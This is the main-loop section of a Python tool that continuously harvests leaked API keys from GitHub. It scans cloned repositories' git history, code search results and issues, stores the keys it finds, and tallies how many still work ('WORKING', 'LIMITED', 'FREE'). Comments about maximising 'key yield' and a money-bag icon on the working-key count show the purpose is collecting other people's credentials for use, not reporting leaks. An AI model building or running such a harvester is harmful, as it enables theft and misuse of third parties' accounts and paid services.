        iss = IssuesScanner(PROJ, TOKENS.tokens)
        iss_thread = threading.Thread(target=iss.loop, args=(_STOP,),
                                      name="issues-scanner", daemon=True)
        iss_thread.start()
    except Exception as e:
        log.warning("Issues scanner init failed: %r", e)

    # Start Paste scanner — paste sites (Google dorks blocked, skip).
    # try:
    #     from paste_scanner import PasteScanner
    #     ...

    # Start Google dork scanner — search engines block scraping, skip.
    # try:
    #     from google_scanner import GoogleScanner
    #     ...

    while not _stopped():
        cycle += 1
        if MAX_CYCLES and cycle > MAX_CYCLES:
            log.info("Reached MAX_CYCLES=%d — stopping.", MAX_CYCLES)
            break

        # Network health check.
        net_ok = False
        for attempt in range(60):
            if _stopped():
                break
            try:
                HTTP.session().get("https://api.github.com/rate_limit",
                                   timeout=10)
                net_ok = True
                break
            except Exception:
                if attempt == 0:
                    log.warning("[NET] Internet down — waiting...")
                time.sleep(30)
        if not net_ok:
            continue

        var_offset = (cycle - 1) % 8
        ext_offset = (cycle - 1) % len(TOP_FILENAMES)
        cycle_start = time.time()

        log.info("")
        log.info("╔══════════════════════════════════════════════╗")
        log.info("║  🔄 CYCLE #%-3d  │  %s          ║",
                 cycle, datetime.now().strftime('%H:%M:%S'))
        log.info("╚══════════════════════════════════════════════╝")

        # NOTE: realtime drain runs in a BACKGROUND THREAD (parallel).

        # PHASE 1: GIT HISTORY (clone known repos, scan history).
        if not _stopped():
            git_found = phase_git_history(CONFIG["git_batch_size"])
            git_new = 0
            for pn, keys in git_found.items():
                for k, repo in keys:
                    if db_add_key(k, pn, repo):
                        git_new += 1

        # PHASE 2: API SEARCH (every cycle — filename-first strategy).
        # Previously was "every 3rd cycle" which skipped 66% of search
        # opportunities and drastically reduced key yield.
        api_new = 0
        if not _stopped():
            new_files, cached = phase_search(var_offset, ext_offset, cycle)
            log.info("   📊 [API] %d new / %d cached files",
                     len(new_files), cached)
            if new_files and not _stopped():
                raw_found = phase_scan_files(new_files)
                for pn, keys in raw_found.items():
                    for k, repo in keys:
                        if db_add_key(k, pn, repo):
                            api_new += 1

        # NOTE: validation runs in separate process (validator.py).

        # Stats + final report.
        c = _connect()
        try:
            stats = dict(c.execute(
                'SELECT status, COUNT(*) FROM keys GROUP BY status').fetchall())
            git = c.execute(
                'SELECT COUNT(*) FROM git_scanned').fetchone()[0]
            known = c.execute(
                'SELECT COUNT(*) FROM known_repos').fetchone()[0]
            new_keys = stats.get("NEW", 0)
            working = stats.get("WORKING", 0)
            limited = stats.get("LIMITED", 0)
            free = stats.get("FREE", 0)
        finally:
            c.close()

        elapsed = time.time() - cycle_start
        log.info("")
        log.info("┌──────────────────────────────────────────────┐")
        log.info("│  ✅ CYCLE #%-3d DONE in %s           │",
                 cycle, f"{elapsed:.0f}s")
        log.info("├──────────────────────────────────────────────┤")
        log.info("│  🆕 New keys this cycle:  git=%-4d api=%-4d    │",
                 git_new, api_new)
        log.info("│  ⏳ Pending validation:    %-19d│", new_keys)
        log.info("├──────────────────────────────────────────────┤")
        log.info("│  💰 Total WORKING:  %-5d                      │",
                 working)
        log.info("│  ⚠️  Total LIMITED:  %-5d   FREE: %-5d         │",
                 limited, free)
        log.info("│  📦 Git scanned: %-6d / Known: %-6d          │",
                 git, known)
        log.info("│  ⚡ Realtime queue: %-5d repos                 │",
                 len(_realtime_repos))
        log.info("└──────────────────────────────────────────────┘")
        log.info("")

        if _stopped():
            break
        time.sleep(CONFIG["cycle_sleep"])

    log.info("Shutdown complete after %d cycle(s).", cycle)
    # Release single-instance lock.
    if lock and lock is not True:
        try:
            Path(lock).unlink(missing_ok=True)
        except Exception:
            pass


if __name__ == '__main__':
    main()
